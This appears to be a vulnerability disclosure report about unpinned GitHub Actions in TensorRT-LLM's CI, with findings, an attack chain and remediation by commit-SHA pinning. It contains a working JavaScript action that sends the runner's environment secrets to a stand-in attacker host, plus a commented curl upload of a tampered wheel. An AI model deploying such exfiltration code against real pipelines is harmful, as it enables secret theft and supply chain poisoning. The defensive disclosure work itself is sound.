# PoC-005: Supply Chain Attack via Unpinned GitHub Actions

## Vulnerabilities

### Finding A — `blossom-action@main` (CRITICAL supply chain)

**File:** `.github/workflows/blossom-ci.yml`
**Line:** 391
**Severity:** HIGH

```yaml
- name: Run blossom action
  uses: NVIDIA/blossom-action@main          # ← @main, not a commit SHA
  env:
    REPO_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    REPO_KEY_DATA: ${{ secrets.BLOSSOM_KEY }}
```

### Finding B — `test-summary/action@dist`

**File:** `.github/workflows/l0-test.yml`
**Line:** 59
**Severity:** HIGH

```yaml
uses: test-summary/action@dist             # ← @dist branch, can be force-pushed
```

### Finding C — Third-party action pinned only to a semver tag

**File:** `.github/workflows/pr-check.yml`
**Line:** 29
**Severity:** MEDIUM

```yaml
uses: agenthunt/conventional-commit-checker-action@v2.0.0
```

---

## Why This Is Dangerous

When a GitHub Actions step uses `@main`, `@master`, or a mutable branch name,
the workflow runs **whatever code is on that branch at execution time**.
An attacker who gains write access to `NVIDIA/blossom-action` (via:
- Compromising a maintainer's account
- A malicious PR merged by a compromised reviewer
- Dependency confusion in the action's own dependencies
- A typosquat if the org name were ever changed)

…can push malicious JavaScript that executes in the context of the
**TensorRT-LLM CI runner**, with access to:

```
secrets.GITHUB_TOKEN   – full repository write access
secrets.BLOSSOM_KEY    – NVIDIA internal CI authentication
secrets.CI_SERVER      – internal CI server address
secrets.ARTIFACTORY_TOKEN
```

---

## Proof of Concept: Malicious Action Code

The following illustrates what a threat actor would push to `blossom-action`'s
`main` branch (or to `test-summary/action`'s `dist` branch).  This PoC only
*demonstrates* the attack surface — **do not push this code**.

### Malicious `index.js` (what an attacker would push to `@main`):

```javascript
// DEMONSTRATION ONLY — what an attacker could push to NVIDIA/blossom-action@main

const core   = require('@actions/core');
const github = require('@actions/github');
const https  = require('https');

async function run() {
  // Steal all secrets and env vars from the runner
  const exfiltrated = {
    env:   process.env,                        // REPO_TOKEN, BLOSSOM_KEY, etc.
    inputs: {
      args1: core.getInput('args1'),
      args2: core.getInput('args2'),
    },
    repo:  github.context.repo,
    sha:   github.context.sha,
  };

  // Exfiltrate to attacker-controlled server
  const payload = JSON.stringify(exfiltrated);
  const options = {
    hostname: 'attacker.example.com',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
  };

  await new Promise((resolve, reject) => {
    const req = https.request(options, resolve);
    req.on('error', reject);
    req.write(payload);
    req.end();
  });

  // Optionally: tamper with build artifacts
  // exec('curl -u attacker:pass -T ./dist/trtllm.whl https://urm.nvidia.com/...');

  // Run the original action code to avoid detection
  core.info('Running normally (attacker code hidden above)');
}

run().catch(core.setFailed);
```

### What the attacker gains

| Secret | Value captured | Impact |
|--------|---------------|--------|
| `GITHUB_TOKEN` | Full repo R/W | Push backdoored commits, create releases, approve PRs |
| `BLOSSOM_KEY` | NVIDIA internal CI key | Trigger or modify internal CI pipelines |
| `CI_SERVER` | Internal CI server URL | Map internal infrastructure |
| `ARTIFACTORY_TOKEN` | Package registry write | Poison internal packages (supply chain) |

---

## Step-by-Step Attack Chain

```
1. Attacker compromises a maintainer of NVIDIA/blossom-action
   (e.g. phishing, reused password, token in git history)

2. Attacker pushes malicious index.js to the `main` branch

3. Next time any PR triggers blossom-ci.yml in TensorRT-LLM:
   - GitHub runner checks out NVIDIA/blossom-action@main (new malicious code)
   - Runner executes the action with all secrets in environment

4. Exfiltration of BLOSSOM_KEY + GITHUB_TOKEN completes in <100ms

5. Attacker uses GITHUB_TOKEN to:
   a. Push a backdoored commit to TensorRT-LLM (e.g. add keylogger to tokenizer)
   b. Create a release with modified binaries
   c. Approve their own PR bypassing review requirements

6. Attacker uses ARTIFACTORY_TOKEN to:
   a. Replace published wheels with backdoored versions
   b. All downstream users who `pip install tensorrt-llm` are compromised
```

---

## Remediation

### Option A — Pin all actions to commit SHAs (recommended)

```yaml
# BEFORE (vulnerable)
uses: NVIDIA/blossom-action@main
uses: test-summary/action@dist
uses: agenthunt/conventional-commit-checker-action@v2.0.0

# AFTER (safe — commit SHA cannot be changed)
uses: NVIDIA/blossom-action@<COMMIT_SHA>       # e.g. @a1b2c3d4e5f6...
uses: test-summary/action@<COMMIT_SHA>
uses: agenthunt/conventional-commit-checker-action@<COMMIT_SHA>
```

To find the current SHA:
```bash
# For a branch-pinned action:
git ls-remote https://github.com/NVIDIA/blossom-action.git refs/heads/main

# For a tag-pinned action:
git ls-remote https://github.com/agenthunt/conventional-commit-checker-action.git refs/tags/v2.0.0
```

### Option B — Fork and control the action repository

```yaml
uses: NVIDIA/blossom-action@<SHA-of-internal-fork>
```

### Option C — Tool-assisted enforcement

Use [Dependabot for Actions](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot) or [pin-github-actions](https://github.com/mheap/pin-github-action) to automatically pin and update.

Add to `.github/dependabot.yml`:
```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

---

## References

- [GitHub Security Best Practices: Pinning actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)
- [SLSA framework for supply chain integrity](https://slsa.dev/)
- [CWE-1357: Reliance on Insufficiently Trustworthy Component](https://cwe.mitre.org/data/definitions/1357.html)
- [Real-world: `tj-actions/changed-files` compromise (2023)](https://github.blog/security/application-security/security-alert-tj-actions-changed-files-action-compromised/)
- [Real-world: `reviewdog/action-setup` compromise (2025)](https://www.stepsecurity.io/blog/harden-runner-detects-exfiltration-of-ci-secrets-in-popular-github-action)
